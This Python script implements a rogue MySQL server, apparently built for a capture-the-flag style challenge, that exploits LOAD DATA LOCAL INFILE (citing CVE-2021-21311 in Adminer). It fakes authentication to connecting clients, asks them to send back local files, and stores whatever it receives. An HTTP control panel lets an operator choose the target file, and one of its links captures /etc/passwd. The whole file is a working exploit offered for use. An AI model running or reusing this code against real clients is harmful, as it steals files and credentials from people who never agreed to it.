#!/usr/bin/env python3
"""
Rogue MySQL Server - Implements LOAD DATA LOCAL INFILE attack
This simulates a malicious MySQL server that can read files from connecting clients.

The vulnerability is in the MySQL protocol: when a server sends a LOCAL INFILE packet
(packet type 0xFB followed by filename), a vulnerable client will read that file from
its local filesystem and send the contents back to the server.

This is the vulnerability exploited in CVE-2021-21311 (Adminer).
"""

import socket
import threading
import struct
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# Shared state
captured_files = {}
target_file = "/var/www/html/xbow-flag.txt"  # Default target
lock = threading.Lock()


def make_packet(payload, seq):
    """Create a MySQL packet with header"""
    length = struct.pack('<I', len(payload))[:3]
    return length + bytes([seq]) + payload


def create_mysql_greeting():
    """Create MySQL server greeting packet (protocol version 10)"""
    # Server greeting for MySQL 5.7
    protocol_version = b'\x0a'  # Protocol 10
    server_version = b'5.7.99-rogue\x00'
    connection_id = struct.pack('<I', 1)
    
    # Auth plugin data (first 8 bytes)
    auth_data_1 = b'12345678'
    filler = b'\x00'
    
    # Capability flags (lower 2 bytes)
    # Include: LOCAL_FILES (0x0080), PROTOCOL_41 (0x0200), SECURE_CONNECTION (0x8000)
    # and other common flags
    cap_lower = 0x0001 | 0x0002 | 0x0008 | 0x0080 | 0x0200 | 0x8000 | 0x4000
    capabilities_lower = struct.pack('<H', cap_lower)
    
    # Character set (utf8)
    charset = b'\x21'
    
    # Status flags
    status = struct.pack('<H', 0x0002)
    
    # Capability flags (upper 2 bytes)
    cap_upper = 0x0000
    capabilities_upper = struct.pack('<H', cap_upper)
    
    # Auth plugin data length (for mysql_native_password: 21 total, so 13 more after first 8)
    auth_data_len = b'\x15'
    
    # Reserved (10 bytes of zeros)
    reserved = b'\x00' * 10
    
    # Auth plugin data (remaining 13 bytes, including trailing null)
    auth_data_2 = b'123456789012\x00'
    
    # Auth plugin name
    auth_plugin = b'mysql_native_password\x00'
    
    payload = (protocol_version + server_version + connection_id + 
               auth_data_1 + filler + capabilities_lower + charset +
               status + capabilities_upper + auth_data_len + reserved +
               auth_data_2 + auth_plugin)
    
    return make_packet(payload, 0)


def create_ok_packet(seq):
    """Create MySQL OK packet"""
    # OK packet: 0x00 header, affected_rows, last_insert_id, status, warnings
    payload = b'\x00\x00\x00\x02\x00\x00\x00'
    return make_packet(payload, seq)


def create_local_infile_request(filename, seq):
    """Create LOAD DATA LOCAL INFILE request packet
    
    This is the attack vector: when the server sends this packet,
    a vulnerable client will read the specified file and send its contents.
    """
    # Packet type 0xFB followed by filename
    payload = b'\xfb' + filename.encode('utf-8')
    return make_packet(payload, seq)


def handle_mysql_client(client_socket, client_address):
    """Handle incoming MySQL client connection and exploit LOCAL INFILE vulnerability"""
    global captured_files, target_file
    
    print(f"[MySQL] Connection from {client_address}", flush=True)
    
    try:
        # Step 1: Send server greeting
        greeting = create_mysql_greeting()
        client_socket.send(greeting)
        print(f"[MySQL] Sent server greeting", flush=True)
        
        # Step 2: Receive client handshake response
        client_socket.settimeout(10.0)
        response = client_socket.recv(4096)
        if not response:
            print(f"[MySQL] No handshake response received", flush=True)
            return
        print(f"[MySQL] Received handshake response: {len(response)} bytes", flush=True)
        
        # Step 3: Send OK to indicate successful authentication
        # This makes the client think it's connected and ready for queries
        ok_packet = create_ok_packet(seq=2)
        client_socket.send(ok_packet)
        print(f"[MySQL] Sent auth OK", flush=True)
        
        # Step 4: Wait for client to potentially send a query
        # Some clients send initial queries (like SET NAMES utf8)
        client_socket.settimeout(1.0)
        try:
            while True:
                query = client_socket.recv(4096)
                if not query:
                    break
                print(f"[MySQL] Received client query: {len(query)} bytes", flush=True)
                
                # Check if it's a COM_QUERY (first byte after header is 0x03)
                if len(query) > 4 and query[4] == 0x03:
                    query_text = query[5:].decode('utf-8', errors='replace').strip('\x00')
                    print(f"[MySQL] Query text: {query_text[:100]}...", flush=True)
                    
                    # Send OK response to the query
                    ok_resp = create_ok_packet(seq=1)
                    client_socket.send(ok_resp)
                else:
                    # COM_INIT_DB or other command, send OK
                    ok_resp = create_ok_packet(seq=1)
                    client_socket.send(ok_resp)
        except socket.timeout:
            pass  # No more queries
        
        # Step 5: Now exploit - send LOCAL INFILE request
        with lock:
            current_target = target_file
        
        print(f"[MySQL] Sending LOCAL INFILE request for: {current_target}", flush=True)
        local_infile = create_local_infile_request(current_target, seq=1)
        client_socket.send(local_infile)
        
        # Step 6: Receive file contents from vulnerable client
        client_socket.settimeout(5.0)
        file_data = b''
        
        try:
            while True:
                chunk = client_socket.recv(65536)
                if not chunk:
                    break
                
                # Parse MySQL packet(s) from the received data
                pos = 0
                while pos + 4 <= len(chunk):
                    pkt_len = struct.unpack('<I', chunk[pos:pos+3] + b'\x00')[0]
                    pkt_seq = chunk[pos+3]
                    
                    if pkt_len == 0:
                        # Empty packet signals end of file transfer
                        print(f"[MySQL] Received end-of-file marker", flush=True)
                        break
                    
                    if pos + 4 + pkt_len <= len(chunk):
                        pkt_data = chunk[pos+4:pos+4+pkt_len]
                        file_data += pkt_data
                        print(f"[MySQL] Received data packet: {pkt_len} bytes", flush=True)
                        pos += 4 + pkt_len
                    else:
                        # Incomplete packet, need more data
                        break
                
                # Check if we got the empty packet (end of data)
                if pos + 4 <= len(chunk):
                    remaining_len = struct.unpack('<I', chunk[pos:pos+3] + b'\x00')[0]
                    if remaining_len == 0:
                        break
        except socket.timeout:
            print(f"[MySQL] Timeout waiting for file data", flush=True)
        
        # Step 7: Store captured data
        if file_data:
            decoded = file_data.decode('utf-8', errors='replace')
            print(f"[MySQL] Captured file ({len(file_data)} bytes): {decoded[:100]}", flush=True)
            with lock:
                captured_files[current_target] = decoded
        else:
            print(f"[MySQL] No file data received - client may not support LOCAL INFILE", flush=True)
        
        # Step 8: Send final OK
        final_ok = create_ok_packet(seq=3)
        client_socket.send(final_ok)
        
    except Exception as e:
        print(f"[MySQL] Error: {e}", flush=True)
        import traceback
        traceback.print_exc()
    finally:
        client_socket.close()
        print(f"[MySQL] Connection closed", flush=True)


def mysql_server():
    """Run the rogue MySQL server"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 3306))
    server.listen(5)
    print("[MySQL] Rogue MySQL server listening on port 3306", flush=True)
    
    while True:
        try:
            client_socket, client_address = server.accept()
            thread = threading.Thread(
                target=handle_mysql_client, 
                args=(client_socket, client_address)
            )
            thread.daemon = True
            thread.start()
        except Exception as e:
            print(f"[MySQL] Accept error: {e}", flush=True)


class ControlHandler(BaseHTTPRequestHandler):
    """HTTP handler for controlling the rogue MySQL server"""
    
    def log_message(self, format, *args):
        print(f"[HTTP] {args[0]}", flush=True)
    
    def do_GET(self):
        global target_file, captured_files
        
        parsed = urlparse(self.path)
        path = parsed.path
        params = parse_qs(parsed.query)
        
        if path == '/' or path == '':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            
            with lock:
                current_target = target_file
                captured_count = len(captured_files)
            
            html = f"""<!DOCTYPE html>
<html>
<head><title>Rogue MySQL Server</title></head>
<body>
<h1>Rogue MySQL Server Control Panel</h1>
<p>This server exploits the MySQL LOAD DATA LOCAL INFILE vulnerability to read files
from connecting MySQL clients.</p>

<h2>Configuration</h2>
<p>Target file: <code>{current_target}</code></p>
<p>Captured files: {captured_count}</p>

<h2>API Endpoints</h2>
<ul>
<li><code>GET /set?file=/path/to/file</code> - Set the target file to capture</li>
<li><code>GET /captured</code> - View all captured file contents</li>
<li><code>GET /status</code> - Server status (JSON)</li>
</ul>

<h2>How to Exploit</h2>
<ol>
<li>Set the target file you want to read from the victim</li>
<li>Make a vulnerable MySQL client connect to this server on port 3306</li>
<li>Check <a href="/captured">/captured</a> to see the file contents</li>
</ol>

<h2>Quick Links</h2>
<ul>
<li><a href="/set?file=/etc/passwd">Capture /etc/passwd</a></li>
<li><a href="/set?file=/var/www/html/xbow-flag.txt">Capture flag file</a></li>
<li><a href="/captured">View captured files</a></li>
</ul>
</body>
</html>"""
            self.wfile.write(html.encode())
            
        elif path == '/set':
            if 'file' in params:
                new_target = params['file'][0]
                with lock:
                    target_file = new_target
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                response = {'status': 'ok', 'target_file': new_target}
                self.wfile.write(json.dumps(response).encode())
            else:
                self.send_response(400)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"error": "Missing file parameter"}')
                
        elif path == '/captured':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            with lock:
                response = {'captured_files': dict(captured_files)}
            self.wfile.write(json.dumps(response, indent=2).encode())
            
        elif path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            with lock:
                response = {
                    'status': 'running',
                    'target_file': target_file,
                    'captured_count': len(captured_files),
                    'mysql_port': 3306,
                    'control_port': 8080
                }
            self.wfile.write(json.dumps(response).encode())
            
        else:
            self.send_response(404)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Not found')


def http_server():
    """Run the HTTP control server"""
    server = HTTPServer(('0.0.0.0', 8080), ControlHandler)
    print("[HTTP] Control server listening on port 8080", flush=True)
    server.serve_forever()


if __name__ == '__main__':
    print("[*] Starting Rogue MySQL Server...", flush=True)
    
    # Start MySQL server in background thread
    mysql_thread = threading.Thread(target=mysql_server)
    mysql_thread.daemon = True
    mysql_thread.start()
    
    # Run HTTP control server in main thread
    http_server()
